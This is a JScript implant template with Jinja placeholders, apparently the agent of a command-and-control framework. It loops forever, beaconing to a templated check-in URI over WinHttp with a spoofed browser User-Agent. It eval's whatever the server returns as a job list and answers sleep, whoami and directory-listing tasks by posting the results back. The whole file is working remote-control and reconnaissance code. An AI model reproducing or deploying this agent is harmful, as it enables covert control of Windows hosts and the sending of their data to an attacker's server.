var errors = 0;
var wscriptshell = new ActiveXObject("WScript.Shell");
var response = '[["{{ check_in_job_id }}"]]';
var sleep = {{ sleep }};

function post(data){
  try {
    var winhttp = new ActiveXObject("WinHttp.WinHttpRequest.5.1");;
    winhttp.Open('Post', '{{ check_in_uri }}');
    winhttp.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0");
    winhttp.setRequestHeader("X-Frame-Options", "SAMEORIGIN");
    winhttp.setRequestHeader("Content-Type", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
    winhttp.Send(data);
    winhttp.WaitForResponse();
    return winhttp;
  } catch (e) {
    errors = errors + 1;
    if(errors > 50){
      WScript.Quit(1);
    }
  }
}

{% include "/jscript/functions/base64.js" %}
{% include "/jscript/functions/dir.js" %}

while (true) {
  try {
      eval("jobs=" + post(response).responseText + ";");
      response = '[["{{ check_in_job_id }}"]';
      for (var key in jobs) {
          if ('sleep' === jobs[key][0]) {
              sleep = jobs[key][1]
              response = response + ',["' + key + '","Sleep change to ' +  sleep + ' milliseconds."]';
          }
          if ('whoami' === jobs[key][0]) {
              username = wscriptshell.ExpandEnvironmentStrings("%USERNAME%");
              response = response + ',["' + key + '","' +  username + '"]';
          }
          try{
              if ('dir' === jobs[key][0]) {
                  var directory = dir(jobs[key][1])
                  response = response + ',["' + key + '","' +  directory + '"]';
              }
          } catch (e) {
             response = response + ',["' + key + '","failed to run"]';
          }

      }
  } catch (e) {
      response = '[["{{ check_in_job_id }}"]]';
  }
  response = response + ']';
  WScript.Sleep(sleep);
}